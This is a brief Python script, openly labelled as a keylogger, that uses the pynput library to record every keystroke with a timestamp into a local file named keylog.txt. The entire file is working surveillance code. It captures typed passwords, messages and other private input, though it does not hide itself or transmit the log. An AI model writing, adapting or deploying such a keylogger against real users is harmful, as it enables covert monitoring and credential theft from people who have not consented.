from pynput import keyboard
from datetime import datetime

#Logs to this file
log_file = "keylog.txt"

#Writes what keys were pressed with time stamp
def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(log_file, "a") as f:
            f.write(f"[{timestamp}] {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{timestamp}] [{key}]\n")

#Starts listening to keyboard
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger is running... Press Ctrl+C to stop.")
    listener.join()
